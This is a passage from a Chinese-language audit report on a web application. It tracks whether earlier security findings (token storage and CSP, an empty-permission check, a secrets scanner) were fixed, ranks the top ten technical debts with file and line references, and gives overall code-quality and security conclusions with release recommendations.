| **M7（安全/前端，中）** | token 仍存 `localStorage`；CSP 仍 `script-src 'unsafe-inline'` 且 `connect-src` 放开 `http:` | ❌ **未闭环，三项全部保持原状**（代码零改动，仅新增解释性注释并落档评估） | `session-store.ts:72`（`window.localStorage`）、`:14`、`:18-28`（自认权衡）；`next.config.js:51`（`"script-src 'self' 'unsafe-inline'"`）、`:55`（`"connect-src 'self' http: https:"`）。`next.config.js:36-44` 的注释明确写「这是**可用的保守起点**，不是最终形态」「要收紧…超出本次修复范围」→ 属**已接受的技术债**，但 README 与验收报告未把 M7 标为「未闭环」。→ 归入 S-01（高） |
| **L3（安全，低）** | `require_permission` 空 `permission` 直接放行 | ❌ **未闭环，代码一字未改** | `security.py:287-288` 仍为 `if not permission: return`。前轮定位行号与本轮**完全相同**。降级理由：核实后确认**当前不可利用**（2 个调用点中，`identity_service.py:116` 的 `_validate_permission_point` 先行拦截空串；11 处端点传的是常量）→ 维持"潜在纵深缺口"，建议按 S-06 修 |
| **L4（安全，低）** | `validate_secrets.py` 只扫 `deploy/` 下 `yml/yaml` 的 `${VAR:-兜底}`，不覆盖 `.env.example` 实值、`install.sh` 等脚本 | ✅ **已闭环（扩面完成）** | `deploy/validate_secrets.py:36-38`（`SCAN_SUFFIXES = {".yml",".yaml",".sh",".example"}`）、`:41-55`（`.env*` 前缀纳入、仅跳过本地 `.env`）、`:70-73`（`DIRECT_ASSIGN_PATTERN` 处理 `VAR=value`）；文件头 `:25-30` 明写「覆盖范围（2026-10-31 审计 L4 扩面）」。实跑 G7 通过。**残留盲区**：仍不覆盖「占位值本身照抄进生产」的场景（这正是 S-05），但那是启动期校验的职责，不属于本脚本 |

**额外核实（前轮未列但值得记录）：**

- `validate_auth_startup` 对 `auth_mode=stub` / `jwt_secret` 空 / `tenant_membership_check=off` 的三重生产拦截**确实生效**（`security.py:896-951`），含 QA-07 的「降级必须带 deadline 且过期即启动失败」——这部分质量高于一般项目。
- 前轮 `docs/archive/audit-2026-10-31-full-repo-audit.md:50` 提到的「conversation/agent/memory 等端点无端点级权限点」仍成立，但**不是漏洞**：这些资源靠「令牌租户 + user_id 过滤 + RLS」做对象级隔离（本轮复核 `conversation/postgres.py:186-195,245-275`、`memory/postgres.py:255-290` 均带 `tenant_clause()`），符合架构 §2.5.2 的口径。**建议补显式安全断言用例**（当前缺），但不必改代码。

---

## 五、技术债 TOP10（按「该处理的优先级」排序）

| # | 债务 | 位置 | 为什么该先处理 |
| --- | --- | --- | --- |
| 1 | **CSP 无 nonce + token 在 localStorage + `connect-src http:`** | `next.config.js:51,55`、`session-store.ts:72` | 三者叠加 = 一次 XSS 即全线失守；是 V1.0 上线前唯一必须拍板的决策（S-01） |
| 2 | **产物下载 `inline` + 任意 MIME（无 `nosniff`）** | `artifact_files.py:84-92,120-138`、`artifact_repo.py:96-101` | 同源存储型 XSS 面；当前因第 3 项而不可达，**必须与第 3 项同批修**（S-02） |
| 3 | **`/files/artifacts` 在 nginx 未路由** | `deploy/nginx/lite.conf`（无 `/files/` 段） | 确定性 404，阶段三"产物下载"在唯一交付编排下不可用（S-03） |
| 4 | **`pay_channel=fake` 无生产守卫（与 `auth_mode=stub` 待遇不一致）** | `config.py:433-445`、`security.py:865` | 一个配置项即可关掉支付验签；补一条 30004 判据即可（S-04） |
| 5 | **`validate_auth_startup` 不拦占位密钥** | `security.py:909-917` | `CHANGE_ME_STRONG_PASSWORD` 能通过；与 S-04 一起做「占位值统一拦截」 |
| 6 | **前端幂等键 per-request 生成** | `api-client.ts:296-299` | 后端 52 个写端点白做了幂等；重复下单/重复扣额度是**真实业务损失**（Q-11/S-09） |
| 7 | **会话历史 4 个端点前端零调用** | `conversation-sidebar.tsx`、`use-conversation-store.ts` | 刷新即丢历史，是**用户可感知的功能缺失**，不是纯内部债务（Q-08 表） |
| 8 | **数据权利 2 个端点（`/ops/tenant-data`、`/export`）前端零调用** | — | 合规承诺的用户自助入口缺失，与 `docs/compliance/*` 的声明不一致 |
| 9 | **`redact()` 死代码 + 未接入 processors** | `logging.py:71-87,108-126` | 看似有防护实则没有；接入成本 3 行（S-08） |
| 10 | **`ruff format --check` 红灯 + README 声称"全绿"** | `member_service.py:194`、`identity_service.py:253`、2 个测试文件；`README.md:187,227` | 门禁红灯会让后来者养成"反正红了"的习惯；修 4 行即可恢复可信度（Q-09） |

**注**：`main.py:13` 的「30 个核心业务端点」陈旧文档串（Q-10）、`KnowledgeBase` 类型漂移（Q-08）、`toBusinessMessage` 透传任意 `Error.message`（Q-12）列为 11-13 位，可在上述修完后顺手带过。

---

## 六、该维度总体结论

**代码质量与规范一致性：优秀，但门禁声明失真。** 后端 205 文件在 `ruff check` / `mypy` 下真实零 error，错误码注册制（G6）与密钥兜底扫描（G7）全绿，`TODO/FIXME` 真实计数为 0——债务通过 60+ 处「审计 2026-xx-xx Lx」文档串显式登记而非 TODO 堆砌，这是成熟团队的做法；`Any` 451 处、`type: ignore` 18 处（17 集中在 `migrate.py`）也说明类型债没有被滥用。失分点集中在三处：**README 声称 ruff format「全绿」但实测 4 文件红灯**（Q-09）、**`mypy` 的「205 文件零 error」是在 `strict=false` 下达成却未披露**（Q-07）、以及 **`about` 页把 Dify/pgvector 直接展示给终端用户**，破掉了技术黑盒化（Q-03）。

**安全：核心控制扎实，但「测试开关 + 前端链路」两块纵深不足。** SQL 注入、命令注入、租户隔离（三重：`tenant_clause` + RLS + `assert_tenant_membership`）、凭据加密（AES-256-GCM + `os.urandom` + 密钥轮转）、支付回调验签顺序——这些最难做对的地方**全部做对了**，且都有"为什么这样做"的注释与用例锁定，明显经过多轮审计打磨。SSRF 当前**不存在攻击面**（5 类连接器全是桩实现），不应作为风险计入。

真正需要动作的是 3 组：**S-01（token 存储 + CSP 三者叠加）是唯一的高危项，也是 V1.0 上线前必须决策的产品级问题**；**S-02/S-03 是一组"产物下载"缺陷**——前者是 `inline` + 任意 MIME 的同源 XSS 面（当前因后者而不可达，属"被 bug 挡住的风险"），后者是该路径在唯一交付编排 nginx 里压根没路由、生产必 404，两者都只需几行配置，但**必须同批修**否则会把前者从"不可利用"变成"可利用"；**S-04/S-05** 则是同一类问题——「测试用开关在生产的守卫待遇不一致」，`auth_mode=stub` 有 30004 拦死、`pay_channel=fake` 与 `JWT_SECRET` 占位值却没有，建议合并成一次「生产禁用项统一拦截」改造。

前轮 M7 与 L3 **均未闭环且代码一字未改**（M7 属已接受决策但未在验收文档标注"未闭环"，L3 经核实当前不可利用、可降级但不该长期留白）；L4 已真实闭环。**综合判定：代码质量可放行，安全侧建议完成 S-01 决策 + S-02/S-03/S-04/S-05 修复后再上公网；S-06 随下一次改动顺手修即可。**
